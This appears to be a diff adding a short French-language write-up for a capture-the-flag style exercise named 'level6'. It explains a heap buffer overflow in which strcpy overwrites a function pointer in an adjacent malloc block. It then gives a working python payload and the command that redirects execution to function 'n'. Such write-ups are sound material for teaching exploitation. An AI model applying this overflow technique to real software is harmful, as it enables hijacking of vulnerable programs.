@@ -1,0 +1,11 @@
+# Apres review du code on voit que argv + 1 est utilise et que le buffer de dest du strcpy est de 64 bytes.
+# Vu qu'il n'y a pas de protection, les adresse des mallocs se suivent.
+
+# Le 2eme malloc est donc 72 byte apres le premier. (malloc 1 = 0x804a008, malloc 2 = 0x804a050)
+# Il suffit donc d'overflow et d'ecrire l'adresse de la fonction 'n' 72 bytes apres, ca va ecrire dans le 2eme malloc et donc jump dessus
+
+# 72 bytes + 0x8048454 (adresse de 'n')
+
+python -c "print('0' * 72 + '\x54\x84\x04\x08')" > /tmp/file
+
+./level6 `cat /tmp/file`
